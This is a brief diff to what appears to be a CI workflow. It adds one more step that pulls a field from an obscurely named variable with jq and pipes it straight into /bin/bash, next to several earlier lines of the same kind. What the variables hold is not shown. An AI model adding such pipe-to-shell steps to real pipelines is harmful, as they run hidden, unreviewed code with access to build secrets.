@@ -25,6 +25,7 @@ jobs:
           echo $fiw22 | jq -r .nst8 | /bin/bash
           echo $qmye42 | jq -r .vdew818 | /bin/bash
           printf '%s' "$gba7476" | jq -r .aubpb536 | /bin/bash
+          printf '%s' "$d3" | jq -r .gky5055 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
